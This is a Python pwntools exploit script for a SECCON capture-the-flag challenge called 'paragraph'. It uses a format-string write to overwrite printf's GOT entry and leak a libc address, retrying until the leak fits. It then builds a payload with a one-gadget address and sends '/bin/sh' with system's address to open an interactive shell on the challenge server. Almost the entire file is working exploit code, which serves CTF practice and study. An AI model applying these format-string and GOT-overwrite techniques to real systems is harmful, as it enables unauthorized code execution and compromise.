from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './chall'
HOST = 'paragraph.seccon.games'
PORT =   5000 

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

while True:
    r = start()

    payload = b''

    payload += f'%8$s%{0x3e00-6}c%8$hn'.encode()
    payload = payload.ljust(0x10, b'a')
    payload += flat(elf.got.printf)[:-1]

    r.sendlineafter(b'.\n', payload)
    leak = u64(r.recvuntil(b' '*0x8, True).ljust(8, b'\x00'))
    if leak & 0xf000 == 0x4000:
        break
    r.close()


base = leak - 0x600f0
system = base + 0x58740
do_system = base + 0x582c0
gad = base + 0xef752
print(f'{base = :#x}')

if args.D:
    debug(r, [0x121c])

payload = b''
payload += b" answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted "
payload += b'aaaabbbbccccddddeeeeffffgggghhhh' 
payload += flat(elf.got.printf+0x20-8, 0x4011d6)
#payload += p64(elf.sym.main).strip(b'\x00')
#payload += p64(do_system+2)
payload += p64(gad)
payload += b" warmly.\n"
r.sendlineafter(b'(@@', payload)
r.sendline(flat(u64(b'/bin/sh\x00'), system))

r.interactive()
r.close()

